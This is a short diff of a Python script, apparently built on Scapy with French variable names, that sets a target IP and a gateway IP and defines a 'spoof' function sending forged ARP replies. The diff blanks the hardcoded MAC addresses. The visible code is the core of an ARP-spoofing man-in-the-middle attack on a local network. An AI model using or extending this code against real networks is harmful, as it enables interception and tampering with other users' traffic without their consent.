@@ -3,9 +3,9 @@ import time
 
 
 Ip_cible = "192.168.1.39"
-Mac_cible = "00:0c:29:f3:e6:91"
+Mac_cible = ""
 Ip_passerelle ="192.168.1.1"
-Mac_passerelle= "cc:19:a8:47:c6:0f"
+Mac_passerelle= ""
 
 def spoof(Ip_dst, Mac_dst,Ip_usurpé):
     packet=ARP(op=2, pdst=Ip_dst, hwdst= Mac_dst, psrc= Ip_usurpé)
